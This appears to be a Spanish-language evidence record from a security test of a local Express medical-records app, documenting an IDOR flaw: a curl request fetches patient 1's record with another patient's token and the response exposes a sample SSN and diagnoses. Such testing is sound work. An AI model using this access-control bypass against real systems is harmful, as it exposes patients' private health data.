# Evidencia evidencia_A01

```text
# Evidencia A01 - Control de acceso roto (IDOR)
# Fecha: 2026-10-04 03:40:19   Fase: fase1   Objetivo: localhost
# Comando: curl -i -s http://localhost:3000/api/record/1 -H 'Authorization: <TOKEN_PACIENTE>'
# Esperado: HTTP 200 con la ficha del paciente 1 (SSN incluido) usando el token de OTRO paciente
# ----------------------------------------------------------
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 279
ETag: W/"117-R07miuu3Z8Xn1Yk6KiC2rSRnoe4"
Date: Sun, 04 Oct 2026 06:40:19 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"id":1,"name":"Juan Perez","ssn":"123-45-6789","bloodType":"O+","allergies":["Penicilina","Mariscos"],"fullHistory":[{"date":"2024-01-15","diagnosis":"Hipertension","treatment":"Losartan 50mg"},{"date":"2024-03-20","diagnosis":"Diabetes Tipo 2","treatment":"Metformina 850mg"}]}

# [curl exit code: 0 (0 = OK, 7 = conexión rechazada, 35/60 = error TLS)]

```
